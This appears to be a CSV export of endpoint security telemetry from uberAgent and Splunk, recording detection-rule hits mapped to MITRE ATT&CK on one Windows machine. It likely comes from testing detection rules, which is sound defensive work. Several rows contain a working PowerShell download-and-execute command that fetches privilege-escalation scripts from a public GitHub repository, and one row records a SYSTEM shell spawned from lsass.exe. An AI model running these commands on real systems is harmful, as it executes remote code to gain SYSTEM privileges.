AdDomainDns,AdOu,AdSite,AppId,AppName,AppVersion,CPUCoresLogical,CPUCoresPhysical,CPUMaxMhz,CPUName,CPUSockets,CtxDeliveryGroupName,CtxFarmName,CtxMachineCatalogName,EventCount,EventType,EventTypeName,GenericProperty10Data,GenericProperty10Name,GenericProperty1Data,GenericProperty1Name,GenericProperty2Data,GenericProperty2Name,GenericProperty3Data,GenericProperty3Name,GenericProperty4Data,GenericProperty4Name,GenericProperty5Data,GenericProperty5Name,GenericProperty6Data,GenericProperty6Name,GenericProperty7Data,GenericProperty7Name,GenericProperty8Data,GenericProperty8Name,GenericProperty9Data,GenericProperty9Name,HashType,HashTypeDisplayName,HwHypervisorVendor,HwIsVirtualMachine,HwManufacturer,HwModel,ImageHash,ImageName,ImagePath,Ipv4Address,IsBatteryPresent,IsElevated,IsProtected,NetProtocol,NetTargetIp,NetTargetName,NetTargetPort,OsBuild,OsPlatform,OsType,OsUpdateBuildRevision,OsVersion,ProcCmdline,ProcGUID,ProcHash,ProcID,ProcLifetimeMs,ProcName,ProcParentGUID,ProcParentID,ProcParentName,ProcPath,ProcRiskScore1,ProcTag1,ProcUser,ProcUserExpanded,RAMSizeGB,RuleAnnotation,"RuleAnnotation.author","RuleAnnotation.mitre_attack.id",SessionGUID,SessionID,Timestamp,"_raw","_time",action,"change_type",command,date,"date_hour","date_mday","date_minute","date_month","date_second","date_wday","date_year","date_zone",dest,"dest_ip","dest_port",direction,eventtype,"file_hash","file_name","file_path",host,index,linecount,"object_category","parent_process_id","parent_process_name",process,"process_guid","process_id","process_name","process_path",protocol,punct,"registry_key_name","registry_path","registry_value_data","registry_value_name",result,"severity_id",signature,source,sourcetype,"splunk_server","splunk_server_group",src,tag,"tag::eventtype",timeendpos,timestartpos,"vendor_product"
,,,MsOnDrv,"Microsoft OneDrive","24.141.0714.0002",,,,,,,,,1,4,"Net.Connect",,,"20.189.173.12","Net.Target.Ip",,"Net.Target.Name",443,"Net.Target.Port",TCP,"Net.Target.Protocol",,,,,,,,,,,,,,,,,,,,,,0,0,,,,,,,,,,"""C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /client=Personal /background","d19a5cd6-7991-2188-00ce-9afaf016c16f",,8584,1841650,"OneDrive.exe","d198336f-7991-2dbc-00ce-9afaf016c16f",11708,"OneDrive.exe","C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe",25,"net-connect-80-443-non-browser","Giowin\iacon",,,"{""mitre_attack"": [""T1105""]}",,T1105,"00000001-b934-a240-5799-2fab3ac6da01",1,1722247481186,"1722247481186,4,OneDrive.exe,OneDrive.exe,""Giowin\\iacon"",1841650,8584,11708,d19a5cd6-7991-2188-00ce-9afaf016c16f,d198336f-7991-2dbc-00ce-9afaf016c16f,""C:\\Users\\iacon\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"",""\""C:\\Users\\iacon\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\"" /client=Personal /background"",net-connect-80-443-non-browser,25,,0,1,00000001-b934-a240-5799-2fab3ac6da01,MsOnDrv,24.141.0714.0002,,,,,,,,,0,1,Net.Target.Ip,20.189.173.12,Net.Target.Name,,Net.Target.Port,443,Net.Target.Protocol,TCP,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1105\""]}""","2024-07-29T12:04:41.186+02:00",allowed,,,1722247481186,10,29,4,july,41,monday,2024,0,"20.189.173.12","20.189.173.12",443,outbound,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Network uberAgent_index_query",,"OneDrive.exe","C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe",GIOWIN,uberagent,1,,11708,"OneDrive.exe","""C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /client=Personal /background","d19a5cd6-7991-2188-00ce-9afaf016c16f",8584,"OneDrive.exe","C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe",TCP,",,.,.,""\\"",,,,----,----,"":\\\\\\\\\\\\\\."",""\"":\\\",,,,,,25,"net-connect-80-443-non-browser",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
communicate
malware
network","attack
communicate
malware
network",13,0,uberAgent
,,,MsOnDrv,"Microsoft OneDrive","24.141.0714.0002",,,,,,,,,1,4,"Net.Connect",,,"20.189.173.12","Net.Target.Ip",,"Net.Target.Name",443,"Net.Target.Port",TCP,"Net.Target.Protocol",,,,,,,,,,,,,,,,,,,,,,0,0,,,,,,,,,,"""C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /client=Personal /background","d19a5cd6-7991-2188-00ce-9afaf016c16f",,8584,1841650,"OneDrive.exe","d198336f-7991-2dbc-00ce-9afaf016c16f",11708,"OneDrive.exe","C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe",50,"net-connect-suspicious-sources","Giowin\iacon",,,"{""mitre_attack"": [""T1105""]}",,T1105,"00000001-b934-a240-5799-2fab3ac6da01",1,1722247481186,"1722247481186,4,OneDrive.exe,OneDrive.exe,""Giowin\\iacon"",1841650,8584,11708,d19a5cd6-7991-2188-00ce-9afaf016c16f,d198336f-7991-2dbc-00ce-9afaf016c16f,""C:\\Users\\iacon\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"",""\""C:\\Users\\iacon\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\"" /client=Personal /background"",net-connect-suspicious-sources,50,,0,1,00000001-b934-a240-5799-2fab3ac6da01,MsOnDrv,24.141.0714.0002,,,,,,,,,0,1,Net.Target.Ip,20.189.173.12,Net.Target.Name,,Net.Target.Port,443,Net.Target.Protocol,TCP,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1105\""]}""","2024-07-29T12:04:41.186+02:00",allowed,,,1722247481186,10,29,4,july,41,monday,2024,0,"20.189.173.12","20.189.173.12",443,outbound,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Network uberAgent_index_query",,"OneDrive.exe","C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe",GIOWIN,uberagent,1,,11708,"OneDrive.exe","""C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /client=Personal /background","d19a5cd6-7991-2188-00ce-9afaf016c16f",8584,"OneDrive.exe","C:\Users\iacon\AppData\Local\Microsoft\OneDrive\OneDrive.exe",TCP,",,.,.,""\\"",,,,----,----,"":\\\\\\\\\\\\\\."",""\"":\\\",,,,,,50,"net-connect-suspicious-sources",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
communicate
malware
network","attack
communicate
malware
network",13,0,uberAgent
,,,MsWnOS,"Microsoft Windows OS",,,,,,,,,,1,1,"Process.Start",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,0,,,,,,,,,,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}","d29b3719-7991-1814-0093-6efd20287da4",,6164,2,"powershell.exe","d28cfd38-7991-2878-0093-6efd20287da4",10360,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",75,"proc-start-suspicious-powershell-download-and-execute-pattern","Giowin\iacon",,,"{""mitre_attack"": [""T1059.001""]}",,"T1059.001","00000001-b934-a240-5799-2fab3ac6da01",1,1722247460638,"1722247460638,1,powershell.exe,powershell.exe,""Giowin\\iacon"",2,6164,10360,d29b3719-7991-1814-0093-6efd20287da4,d28cfd38-7991-2878-0093-6efd20287da4,""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",""\""powershell.exe\"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}"",proc-start-suspicious-powershell-download-and-execute-pattern,75,,1,1,00000001-b934-a240-5799-2fab3ac6da01,MsWnOS,,,,,,,,,,0,1,,,,,,,,,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1059.001\""]}""","2024-07-29T12:04:20.638+02:00",started,,,1722247460638,10,29,4,july,20,monday,2024,0,GIOWIN,,,,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Process uberAgent_index_query",,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",GIOWIN,uberagent,1,,10360,"powershell.exe","""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}","d29b3719-7991-1814-0093-6efd20287da4",6164,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,",,.,.,""\\"",,,,----,----,"":\\\\\\\\.\\."",""\"".\""_&_{",,,,,,75,"proc-start-suspicious-powershell-download-and-execute-pattern",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
malware
process
report","attack
malware
process
report",13,0,uberAgent
,,,MsWnOS,"Microsoft Windows OS",,,,,,,,,,1,1,"Process.Start",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,0,,,,,,,,,,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}","d29b3719-7991-1814-0093-6efd20287da4",,6164,1,"powershell.exe","d28cfd38-7991-2878-0093-6efd20287da4",10360,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",75,"proc-start-powershell-download-and-execution-cradles","Giowin\iacon",,,"{""mitre_attack"": [""T1059""]}",,T1059,"00000001-b934-a240-5799-2fab3ac6da01",1,1722247460621,"1722247460621,1,powershell.exe,powershell.exe,""Giowin\\iacon"",1,6164,10360,d29b3719-7991-1814-0093-6efd20287da4,d28cfd38-7991-2878-0093-6efd20287da4,""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",""\""powershell.exe\"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}"",proc-start-powershell-download-and-execution-cradles,75,,1,1,00000001-b934-a240-5799-2fab3ac6da01,MsWnOS,,,,,,,,,,0,1,,,,,,,,,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1059\""]}""","2024-07-29T12:04:20.621+02:00",started,,,1722247460621,10,29,4,july,20,monday,2024,0,GIOWIN,,,,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Process uberAgent_index_query",,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",GIOWIN,uberagent,1,,10360,"powershell.exe","""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}","d29b3719-7991-1814-0093-6efd20287da4",6164,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,",,.,.,""\\"",,,,----,----,"":\\\\\\\\.\\."",""\"".\""_&_{",,,,,,75,"proc-start-powershell-download-and-execution-cradles",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
malware
process
report","attack
malware
process
report",13,0,uberAgent
,,,MsWnOS,"Microsoft Windows OS",,,,,,,,,,1,1,"Process.Start",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1,0,,,,,,,,,,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}","d29b3719-7991-1814-0093-6efd20287da4",,6164,1,"powershell.exe","d28cfd38-7991-2878-0093-6efd20287da4",10360,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",75,"proc-start-malicious-powershell-commandlets-processcreation","Giowin\iacon",,,"{""mitre_attack"": [""T1482"", ""T1087"", ""T1087.001"", ""T1087.002"", ""T1069.001"", ""T1069.002"", ""T1069"", ""T1059.001""]}",,"T1482
T1087
T1087.001
T1087.002
T1069.001
T1069.002
T1069
T1059.001","00000001-b934-a240-5799-2fab3ac6da01",1,1722247460621,"1722247460621,1,powershell.exe,powershell.exe,""Giowin\\iacon"",1,6164,10360,d29b3719-7991-1814-0093-6efd20287da4,d28cfd38-7991-2878-0093-6efd20287da4,""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",""\""powershell.exe\"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}"",proc-start-malicious-powershell-commandlets-processcreation,75,,1,1,00000001-b934-a240-5799-2fab3ac6da01,MsWnOS,,,,,,,,,,0,1,,,,,,,,,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1482\"", \""T1087\"", \""T1087.001\"", \""T1087.002\"", \""T1069.001\"", \""T1069.002\"", \""T1069\"", \""T1059.001\""]}""","2024-07-29T12:04:20.621+02:00",started,,,1722247460621,10,29,4,july,20,monday,2024,0,GIOWIN,,,,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Process uberAgent_index_query",,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",GIOWIN,uberagent,1,,10360,"powershell.exe","""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}","d29b3719-7991-1814-0093-6efd20287da4",6164,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,",,.,.,""\\"",,,,----,----,"":\\\\\\\\.\\."",""\"".\""_&_{",,,,,,75,"proc-start-malicious-powershell-commandlets-processcreation",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
malware
process
report","attack
malware
process
report",13,0,uberAgent
,,,MsWnOS,"Microsoft Windows OS",,,,,,,,,,1,4,"Net.Connect",,,"79.140.81.99","Net.Target.Ip",,"Net.Target.Name",443,"Net.Target.Port",TCP,"Net.Target.Protocol",,,,,,,,,,,,,,,,,,,,,,0,0,,,,,,,,,,"C:\Windows\Explorer.EXE","cf88d2cf-798a-0318-00af-58db65b979a8",,792,3011629312,"explorer.exe",,5076,,"C:\Windows\explorer.exe",25,"net-connect-80-443-non-browser","Giowin\iacon",,,"{""mitre_attack"": [""T1105""]}",,T1105,"00000001-b934-a240-5799-2fab3ac6da01",1,1722247459144,"1722247459144,4,explorer.exe,,""Giowin\\iacon"",3011629312,792,5076,cf88d2cf-798a-0318-00af-58db65b979a8,,""C:\\Windows\\explorer.exe"",""C:\\Windows\\Explorer.EXE"",net-connect-80-443-non-browser,25,,0,1,00000001-b934-a240-5799-2fab3ac6da01,MsWnOS,,,,,,,,,,0,1,Net.Target.Ip,79.140.81.99,Net.Target.Name,,Net.Target.Port,443,Net.Target.Protocol,TCP,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1105\""]}""","2024-07-29T12:04:19.144+02:00",allowed,,,1722247459144,10,29,4,july,19,monday,2024,0,"79.140.81.99","79.140.81.99",443,outbound,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Network uberAgent_index_query",,"explorer.exe","C:\Windows\explorer.exe",GIOWIN,uberagent,1,,5076,,"C:\Windows\Explorer.EXE","cf88d2cf-798a-0318-00af-58db65b979a8",792,"explorer.exe","C:\Windows\explorer.exe",TCP,",,.,,""\\"",,,,----,,"":\\\\."","":\\\\."",-----,,,,,---",,,,,,25,"net-connect-80-443-non-browser",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
communicate
malware
network","attack
communicate
malware
network",13,0,uberAgent
,,,MsWnOS,"Microsoft Windows OS",,,,,,,,,,1,4,"Net.Connect",,,"185.199.111.133","Net.Target.Ip","raw.githubusercontent.com","Net.Target.Name",443,"Net.Target.Port",TCP,"Net.Target.Protocol",,,,,,,,,,,,,,,,,,,,,,1,0,,,,,,,,,,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}","d29aa372-7991-160c-0093-6efd20287da4",,5644,1108,"powershell.exe","d28cfd38-7991-2878-0093-6efd20287da4",10360,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",25,"net-connect-80-443-non-browser","Giowin\iacon",,,"{""mitre_attack"": [""T1105""]}",,T1105,"00000001-b934-a240-5799-2fab3ac6da01",1,1722247458049,"1722247458049,4,powershell.exe,powershell.exe,""Giowin\\iacon"",1108,5644,10360,d29aa372-7991-160c-0093-6efd20287da4,d28cfd38-7991-2878-0093-6efd20287da4,""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",""\""powershell.exe\"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}"",net-connect-80-443-non-browser,25,,1,1,00000001-b934-a240-5799-2fab3ac6da01,MsWnOS,,,,,,,,,,0,1,Net.Target.Ip,185.199.111.133,Net.Target.Name,raw.githubusercontent.com,Net.Target.Port,443,Net.Target.Protocol,TCP,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1105\""]}""","2024-07-29T12:04:18.049+02:00",allowed,,,1722247458049,10,29,4,july,18,monday,2024,0,"raw.githubusercontent.com","185.199.111.133",443,outbound,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Network uberAgent_index_query",,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",GIOWIN,uberagent,1,,10360,"powershell.exe","""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}","d29aa372-7991-160c-0093-6efd20287da4",5644,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",TCP,",,.,.,""\\"",,,,----,----,"":\\\\\\\\.\\."",""\"".\""_&_{",,,,,,25,"net-connect-80-443-non-browser",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
communicate
malware
network","attack
communicate
malware
network",13,0,uberAgent
,,,MsWnOS,"Microsoft Windows OS",,,,,,,,,,1,4,"Net.Connect",,,"185.199.111.133","Net.Target.Ip","raw.githubusercontent.com","Net.Target.Name",443,"Net.Target.Port",TCP,"Net.Target.Protocol",,,,,,,,,,,,,,,,,,,,,,1,0,,,,,,,,,,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}","d29aa372-7991-160c-0093-6efd20287da4",,5644,1108,"powershell.exe","d28cfd38-7991-2878-0093-6efd20287da4",10360,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",50,"net-connect-Windows-processes","Giowin\iacon",,,"{""mitre_attack"": [""T1105""]}",,T1105,"00000001-b934-a240-5799-2fab3ac6da01",1,1722247458049,"1722247458049,4,powershell.exe,powershell.exe,""Giowin\\iacon"",1108,5644,10360,d29aa372-7991-160c-0093-6efd20287da4,d28cfd38-7991-2878-0093-6efd20287da4,""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",""\""powershell.exe\"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}"",net-connect-Windows-processes,50,,1,1,00000001-b934-a240-5799-2fab3ac6da01,MsWnOS,,,,,,,,,,0,1,Net.Target.Ip,185.199.111.133,Net.Target.Name,raw.githubusercontent.com,Net.Target.Port,443,Net.Target.Protocol,TCP,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1105\""]}""","2024-07-29T12:04:18.049+02:00",allowed,,,1722247458049,10,29,4,july,18,monday,2024,0,"raw.githubusercontent.com","185.199.111.133",443,outbound,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Network uberAgent_index_query",,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",GIOWIN,uberagent,1,,10360,"powershell.exe","""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}","d29aa372-7991-160c-0093-6efd20287da4",5644,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",TCP,",,.,.,""\\"",,,,----,----,"":\\\\\\\\.\\."",""\"".\""_&_{",,,,,,50,"net-connect-Windows-processes",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
communicate
malware
network","attack
communicate
malware
network",13,0,uberAgent
,,,MsWnOS,"Microsoft Windows OS",,,,,,,,,,1,4,"Net.Connect",,,"185.199.111.133","Net.Target.Ip","raw.githubusercontent.com","Net.Target.Name",443,"Net.Target.Port",TCP,"Net.Target.Protocol",,,,,,,,,,,,,,,,,,,,,,1,0,,,,,,,,,,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}","d29aa372-7991-160c-0093-6efd20287da4",,5644,1107,"powershell.exe","d28cfd38-7991-2878-0093-6efd20287da4",10360,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",75,"net-connect-suspicious-target-names","Giowin\iacon",,,"{""mitre_attack"": [""T1105""]}",,T1105,"00000001-b934-a240-5799-2fab3ac6da01",1,1722247458049,"1722247458049,4,powershell.exe,powershell.exe,""Giowin\\iacon"",1107,5644,10360,d29aa372-7991-160c-0093-6efd20287da4,d28cfd38-7991-2878-0093-6efd20287da4,""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",""\""powershell.exe\"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}"",net-connect-suspicious-target-names,75,,1,1,00000001-b934-a240-5799-2fab3ac6da01,MsWnOS,,,,,,,,,,0,1,Net.Target.Ip,185.199.111.133,Net.Target.Name,raw.githubusercontent.com,Net.Target.Port,443,Net.Target.Protocol,TCP,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1105\""]}""","2024-07-29T12:04:18.049+02:00",allowed,,,1722247458049,10,29,4,july,18,monday,2024,0,"raw.githubusercontent.com","185.199.111.133",443,outbound,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Network uberAgent_index_query",,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",GIOWIN,uberagent,1,,10360,"powershell.exe","""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}","d29aa372-7991-160c-0093-6efd20287da4",5644,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",TCP,",,.,.,""\\"",,,,----,----,"":\\\\\\\\.\\."",""\"".\""_&_{",,,,,,75,"net-connect-suspicious-target-names",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
communicate
malware
network","attack
communicate
malware
network",13,0,uberAgent
,,,MsWnOS,"Microsoft Windows OS",,,,,,,,,,1,1,"Process.Start",,,"C:\Windows\System32\lsass.exe","Parent.Path","NT AUTHORITY\SYSTEM","Process.User",,,,,,,,,,,,,,,,,,,,,,,,,,1,0,,,,,,,,,,"powershell.exe","d29ac5ea-7991-0c5c-0093-6efd20287da4",,3164,1,"powershell.exe","cf87ff90-798a-0324-0037-830fe3061f26",804,"lsass.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",75,"proc-start-abused-debug-privilege-by-arbitrary-parent-processes",sys,SYSTEM,,"{""mitre_attack"": [""T1548""]}",,T1548,"00000001-b934-a240-5799-2fab3ac6da01",1,1722247457731,"1722247457731,1,powershell.exe,lsass.exe,sys,1,3164,804,d29ac5ea-7991-0c5c-0093-6efd20287da4,cf87ff90-798a-0324-0037-830fe3061f26,""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",powershell.exe,proc-start-abused-debug-privilege-by-arbitrary-parent-processes,75,,1,1,00000001-b934-a240-5799-2fab3ac6da01,MsWnOS,,,,,,,,,,0,1,Parent.Path,""C:\\Windows\\System32\\lsass.exe"",Process.User,""NT AUTHORITY\\SYSTEM"",,,,,,,,,,,,,,,,,""{\""mitre_attack\"": [\""T1548\""]}""","2024-07-29T12:04:17.731+02:00",started,,,1722247457731,10,29,4,july,17,monday,2024,0,GIOWIN,,,,"uberAgentESA:ActivityMonitoring:ProcessTagging uberAgentESA_ActivityMonitoring_Process uberAgent_index_query",,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",GIOWIN,uberagent,1,,804,"lsass.exe","powershell.exe","d29ac5ea-7991-0c5c-0093-6efd20287da4",3164,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,",,.,.,,,,,----,----,"":\\\\\\\\.\\."",.,--------,,,,",,,,,,75,"proc-start-abused-debug-privilege-by-arbitrary-parent-processes",uberAgent,"uberAgentESA:ActivityMonitoring:ProcessTagging","gio-Precision-5530",,GIOWIN,"attack
malware
process
report","attack
malware
process
report",13,0,uberAgent
